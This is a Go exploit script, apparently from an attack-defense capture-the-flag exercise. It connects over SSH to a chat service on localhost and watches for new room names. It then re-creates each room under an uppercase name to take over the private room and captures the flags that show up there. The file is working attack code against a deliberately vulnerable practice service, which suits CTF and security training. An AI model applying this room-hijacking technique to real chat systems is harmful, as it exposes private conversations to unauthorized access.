package main

import (
	"bufio"
	"checker/pkg/client"
	"context"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/acarl005/stripansi"
)

func hijackPrivateRoom(roomName string) error {
	upperRoom := strings.ToUpper(roomName)
	if roomName == upperRoom {
		return fmt.Errorf("room already hijacked")
	}

	//wait some time until the flag arrives
	<-time.After(time.Second * 3)
	hijacker, err := client.GenerateNewUser()
	if err != nil {
		return err
	}

	_, sessIO, ch, err := client.CreateSSHSession(context.Background(), hijacker.Name, "localhost", hijacker.PrivateKey)
	if err != nil {
		return err
	}

	_, err = fmt.Fprintf(sessIO, "/create %s 1234\n\r", upperRoom)
	if err != nil {
		ch.Execute()
		return err
	}

	// leave chat and rejoin
	<-time.After(time.Second)
	ch.Execute()
	<-time.After(time.Second)

	_, sessIO, ch, err = client.CreateSSHSession(context.Background(), hijacker.Name, "localhost", hijacker.PrivateKey)
	if err != nil {
		return err
	}
	defer ch.Execute()

	flagChan := make(chan string)
	scanner := bufio.NewScanner(sessIO)
	go func() {
		for scanner.Scan() {
			txt := stripansi.Strip(scanner.Text())
			if strings.Contains(txt, "ENO") {
				flagChan <- txt
			}
		}
		if err := scanner.Err(); err != nil {
			log.Println(err)
		}
		close(flagChan)
	}()

	select {
	case <-time.After(time.Second * 5):
		return fmt.Errorf("flag not found")
	case flag := <-flagChan:
		log.Printf("FOUND FLAG %s", flag)
		return nil
	}
}

func run() error {
	attacker, err := client.GenerateNewUser()
	if err != nil {
		return err
	}

	_, sessIO, ch, err := client.CreateSSHSession(context.Background(), attacker.Name, "localhost", attacker.PrivateKey)
	if err != nil {
		return err
	}
	defer ch.Execute()

	roomChan := make(chan string)
	scanner := bufio.NewScanner(sessIO)
	go func() {
		for scanner.Scan() {
			txt := stripansi.Strip(scanner.Text())
			if strings.Contains(txt, "was created by") {
				splitTxt := strings.Split(txt, " ")
				if splitTxt[2] == "->" {
					roomChan <- splitTxt[4]
				} else {
					roomChan <- splitTxt[3]
				}
			}
		}
		if err := scanner.Err(); err != nil {
			log.Println(err)
		}
		close(roomChan)
	}()

	for roomName := range roomChan {
		log.Printf("trying room %s", roomName)
		err = hijackPrivateRoom(roomName)
		if err != nil {
			log.Println(err)
		}
	}
	return nil
}

func main() {
	log.Println("starting...")
	if err := run(); err != nil {
		log.Fatal(err)
	}
	log.Println("done.")
}
